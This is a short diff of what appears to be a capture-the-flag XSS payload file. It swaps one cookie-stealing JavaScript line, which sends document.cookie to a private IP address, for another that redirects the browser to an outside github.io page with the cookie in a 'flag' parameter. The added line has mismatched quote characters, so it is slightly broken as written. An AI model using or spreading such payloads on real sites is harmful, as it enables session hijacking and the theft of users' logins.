@@ -1,2 +1,2 @@
-new Image().src='http://10.210.34.73:5000'+document.cookie
+`location.href=”https://ahzero7d1.github.io/?flag="+document.cookie;
 
